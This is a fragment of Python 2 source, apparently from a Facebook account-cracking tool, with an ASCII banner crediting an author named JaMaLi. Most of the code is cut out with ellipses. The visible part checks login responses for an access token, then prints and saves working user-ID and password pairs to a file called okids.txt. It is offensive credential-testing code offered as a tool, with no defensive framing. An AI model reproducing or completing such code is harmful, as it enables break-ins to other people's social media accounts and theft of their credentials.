...
`-'  `---\||_| \)\|_|  (_) 
               (__)        
\033[1;92mAuthor \033[1;93m: JaMaLi
\033[1;92mFb \033[1;93m: Iqra Shah
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[Iqra-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
